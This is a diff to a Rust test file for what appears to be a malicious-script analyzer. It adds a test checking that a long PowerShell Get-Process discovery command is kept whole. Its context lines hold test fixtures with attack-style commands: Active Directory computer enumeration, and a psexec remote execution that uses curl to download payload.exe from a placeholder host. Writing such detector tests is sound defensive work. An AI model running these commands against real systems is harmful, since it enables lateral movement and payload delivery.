@@ -4805,6 +4805,38 @@ powershell -Command "Get-ADComputer -Filter *"
     }
 
     #[test]
+    fn powershell_discovery_enumeration_command_is_not_truncated() {
+        let long_marker = "tail-marker-preserved-after-a-very-long-discovery-command";
+        let script = format!(
+            r#"powershell -Command "Get-Process -Name {}""#,
+            [
+                "alpha0001",
+                "bravo0002",
+                "charlie0003",
+                "delta0004",
+                "echo0005",
+                "foxtrot0006",
+                "golf0007",
+                "hotel0008",
+                "india0009",
+                long_marker,
+            ]
+            .join(",")
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "ps-get-process" && command.contains(long_marker)
+            )),
+            "long PowerShell discovery command was truncated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
